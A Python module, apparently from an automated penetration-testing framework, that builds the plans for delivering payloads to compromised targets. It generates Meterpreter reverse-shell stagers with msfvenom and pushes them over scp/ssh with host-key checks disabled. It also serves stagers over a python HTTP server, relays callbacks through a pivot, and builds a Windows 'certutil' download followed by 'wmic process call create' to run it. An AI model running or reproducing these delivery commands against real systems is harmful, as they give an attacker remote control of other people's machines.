"""Build commands and parameters for declared session deliveries."""
from __future__ import annotations

import os
import re


DELIVERY_SSH_OPTIONS = ("-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                        "-o BatchMode=yes")
DELIVERY_REMOTE_DIR = "/tmp"
DELIVERY_MATERIALS_DIR = "/tmp/agv-materials"


def _delivery_step(command, timeout):
    """One control-side step in the shape the delivery recorder already validates."""
    return {"request": {"tool": "cmd", "cmd": command}, "platform": "linux",
            "binding": None, "timeout": timeout}


def _fill_delivery_template(template, values):
    """Bind the runtime's own values; anything left unbound is refused by name."""
    text = str(template or "")
    for key, value in values.items():
        text = text.replace("{" + key + "}", str(value))
    #: Placeholder-shaped leftovers are refused; braces that belong to real code are not.
    if re.search(r"\{[a-z_][a-z0-9_]*\}", text):
        raise ValueError("SESSION_DELIVERY_TEMPLATE_UNBOUND")
    return text


def build_delivery_declaration(spec, *, control, target_host, materials_dir, nonce,
                               handler_port, target_port="", fetch_port=None, timeout=300.0):
    """Turn a card's declared delivery spec into this run's concrete delivery plan.

    The card declares the capability it hands over (payload, entry, transport and what the
    session can carry). The runtime owns the resources: the run's own key, the stager path,
    the reserved handler port, the fetch service, the one line the node runs, and the
    cleanup. Nothing here comes from model output, and a missing declaration is refused.
    """
    if not isinstance(spec, dict):
        raise ValueError("SESSION_DELIVERY_SPEC_INVALID")
    payload = spec.get("payload")
    entry = spec.get("entry") or {}
    transport = str(spec.get("transport") or "scp")
    capabilities = spec.get("capabilities")
    if (not isinstance(payload, dict) or not str(payload.get("path") or "").strip()
            or transport not in ("scp", "http")
            or (not isinstance(entry, dict) or (not entry and transport == "scp"))):
        raise ValueError("SESSION_DELIVERY_SPEC_INVALID")
    if not isinstance(capabilities, dict) or set(capabilities) != {"capacity", "shell_ready"}:
        raise ValueError("SESSION_DELIVERY_CAPABILITIES_REQUIRED")
    kind = str(payload.get("kind") or "meterpreter")
    fmt = str(payload.get("format") or "elf")
    path = str(payload["path"]).strip()
    port = int(handler_port)
    directory = str(materials_dir).rstrip("/")
    key_path = "%s/agv_%s.key" % (directory, nonce)
    stager = "%s/agv_%s.bin" % (directory, nonce)
    user = str(entry.get("username") or "root").strip()
    prepare = []
    resources = [{"host": control, "port": port, "protocol": "tcp"}]
    cleanup = ["rm -f %s %s.pub %s; echo cleaned" % (key_path, key_path, stager)]
    if str(entry.get("driver") or "") == "ssh":
        prepare.append(_delivery_step(
            "mkdir -p %s && ssh-keygen -q -t rsa -b 2048 -N '' -f %s >/dev/null 2>&1; "
            "chmod 600 %s; cat %s.pub" % (directory, key_path, key_path, key_path), 60.0))
    prepare.append(_delivery_step(
        "mkdir -p %s && /usr/bin/msfvenom -p %s LHOST=%s LPORT=%d -f %s -o %s && chmod 644 %s"
        % (directory, path, control, port, fmt, stager, stager), timeout))
    stage_payload = ""
    if transport == "scp":
        command = ("scp -i %s %s %s %s@%s:%s && ssh -i %s %s %s@%s "
                   "'chmod +x %s; nohup %s >/dev/null 2>&1 &'"
                   % (key_path, DELIVERY_SSH_OPTIONS, stager, user, target_host,
                      DELIVERY_REMOTE_DIR + "/agv_" + nonce,
                      key_path, DELIVERY_SSH_OPTIONS, user, target_host,
                      DELIVERY_REMOTE_DIR + "/agv_" + nonce,
                      DELIVERY_REMOTE_DIR + "/agv_" + nonce))
        remote_stager = "%s/agv_%s" % (DELIVERY_REMOTE_DIR, nonce)
    else:
        #: A target reached through its own code path (a web shell, a credential route)
        #: fetches the stager from the run's control box. The card owns that command; the
        #: runtime owns the address, the port, the file name and the fetch service.
        template = str(spec.get("command") or "").strip()
        if fetch_port is None or not template:
            raise ValueError("SESSION_DELIVERY_HTTP_INCOMPLETE")
        remote = spec.get("remote") if isinstance(spec.get("remote"), dict) else {}
        remote_dir = str(remote.get("dir") or DELIVERY_REMOTE_DIR).rstrip("/") or "/"
        separator = "\\" if "\\" in remote_dir else "/"
        remote_stager = "%s%sagv_%s%s" % (remote_dir, separator, nonce,
                                          str(remote.get("suffix") or ""))
        fetch_url = "http://%s:%d/%s" % (control, int(fetch_port), os.path.basename(stager))
        prepare.append(_delivery_step(
            "mkdir -p %s && cd %s && setsid python3 -m http.server %d --bind %s "
            ">%s/http.log 2>&1 & echo $! > %s/http.pid; "
            "for _i in 1 2 3 4 5 6 7 8 9 10; do ss -lnt | grep -q ':%d ' && exit 0; sleep 1; "
            "done; ss -lnt | grep -q ':%d '"
            % (directory, directory, int(fetch_port), control, directory, directory,
               int(fetch_port), int(fetch_port)), 90.0))
        resources.append({"host": control, "port": int(fetch_port), "protocol": "tcp"})
        cleanup.append("kill $(cat %s/http.pid) 2>/dev/null || true; "
                       "rm -f %s/http.pid %s/http.log; echo stopped"
                       % (directory, directory, directory))
        values = {"fetch_url": fetch_url, "remote_path": remote_stager,
                  "remote_dir": remote_dir, "remote_file": os.path.basename(remote_stager),
                  "handler_port": str(port), "target_host": str(target_host),
                  "username": user, "key_path": key_path, "stager": stager,
                  "target_port": str(target_port)}
        command = _fill_delivery_template(template, values)
        #: A web entry needs something to put on the target that brings the stager over: the
        #: card's template says what, the runtime binds where it comes from and where it lands.
        stage = str(spec.get("stage_payload") or "").strip()
        if stage:
            stage_payload = _fill_delivery_template(stage, values)
    declaration = {
        "prepare": prepare,
        "cleanup": [_delivery_step(item, 60.0) for item in cleanup],
        "resources": resources,
        "expected": {"session_host": str(target_host), "type": kind,
                     "tunnel_local": "%s:%d" % (control, port)},
        "capabilities": capabilities,
        "command": command,
        "handler": {"payload": path, "lhost": control, "lport": port},
        "materials": {"key_path": key_path, "public_key": key_path + ".pub",
                      "stager": stager, "remote_stager": remote_stager,
                      "handler_port": port},
    }
    if stage_payload:
        declaration["stage_payload"] = stage_payload
        declaration["materials"]["stage_payload"] = stage_payload
    if transport == "scp":
        #: The card owns the method; the runtime owns the plumbing. A nested-quote line is
        #: exactly what a model gets wrong, so the run hands it over already finished.
        template = entry.get("authorize_command")
        if template:
            declaration["authorize_command"] = _fill_delivery_template(
                template, {"public_key_file": key_path + ".pub", "key_path": key_path,
                           "target_host": str(target_host), "target_port": str(target_port),
                           "username": user, "handler_port": str(port),
                           "remote_stager": remote_stager, "stager": stager})
            declaration["materials"]["authorize_command"] = declaration["authorize_command"]
    return declaration


def relay_delivery_declaration(*, spec, control, target_host, pivot, pivot_port, handler_port,
                               materials_dir, nonce, remote_dir, suffix, target_port=""):
    """Assemble the plan for a hand-over whose callback comes back through a pivot.

    The return route itself is installed by the caller (`runtime.relay.arm_return`), because it has
    to run inside the carrier. This describes only what the plan owns: the control-end stager named
    for the address the target can reach, the handler port, the pivot-side listen port, and the
    fields the session must land with. The session fields are the same shape as a direct delivery
    (measured 2026-08-10-08 on the lab: `session_host` is the target, `tunnel_local` the console).
    """
    payload = spec.get("payload") or {}
    path = str(payload.get("path") or "").strip()
    kind = str(payload.get("kind") or "meterpreter")
    fmt = str(payload.get("format") or "exe")
    if not path:
        raise ValueError("SESSION_DELIVERY_PAYLOAD_UNDECLARED")
    separator = "\\" if "\\" in str(remote_dir) else "/"
    remote_stager = "%s%sagv_%s%s" % (str(remote_dir).rstrip("\\/"), separator, nonce, suffix)
    stager = "%s/agv_%s.bin" % (materials_dir, nonce)
    return {
        "prepare": [_delivery_step(
            "mkdir -p %s && /usr/bin/msfvenom -p %s LHOST=%s LPORT=%d -f %s -o %s && chmod 644 %s "
            "&& wc -c %s" % (materials_dir, path, pivot, int(pivot_port), fmt, stager, stager, stager),
            300.0)],
        #: 控制端这一侧只拥有自己造的那份材料；跳板上的投放物与转发规则由 `arm_return` 自己记账。
        "cleanup": [_delivery_step("rm -f %s %s.b64; echo cleaned" % (stager, stager), 60.0)],
        "resources": [{"host": control, "port": int(handler_port), "protocol": "tcp"},
                      {"host": pivot, "port": int(pivot_port), "protocol": "tcp"}],
        "expected": {"session_host": str(target_host),
                     "tunnel_local": "%s:%d" % (control, int(handler_port)), "type": kind},
        "capabilities": {"capacity": {"max_bytes": 4096, "source": "meterpreter shell_write limit"},
                         "shell_ready": True},
        "command": "echo AGV_DELIVERY_TRIGGER",
        "handler": {"lhost": control, "lport": int(handler_port), "payload": path},
        "materials": {"stager": stager, "remote_stager": remote_stager, "pivot": pivot,
                      #: 跳板上那份与目标上那份**同名**（同一个字符串）：模型只需把它从位置拷到目标，
                      #: 免得两个路径不一致时抄错。
                      "pivot_stager": remote_stager,
                      "pivot_port": int(pivot_port), "handler_port": int(handler_port),
                      "target_port": str(target_port)},
    }


def windows_delivery_command(*, fetch_host, fetch_port, stager, remote) -> str:
    """Windows 目标上"取回 stager 并把它起起来"的那一条 —— 凭据 / SMB / 远程执行路线用这条。

    2026-10-06 walk-51 的教训：这条命令原来是个占位符（`echo agv-entry-ok`），真正的动作只写在给 web 入口的
    PHP 载荷里，于是走凭据路线的 node 44 根本没有可用的交付动作。取件地址用跳板在目标侧的地址（不是控制端）。
    """
    return ("cmd /c certutil -urlcache -f http://%s:%d/%s %s & wmic process call create \"%s\""
            % (fetch_host, int(fetch_port), stager, remote, remote))
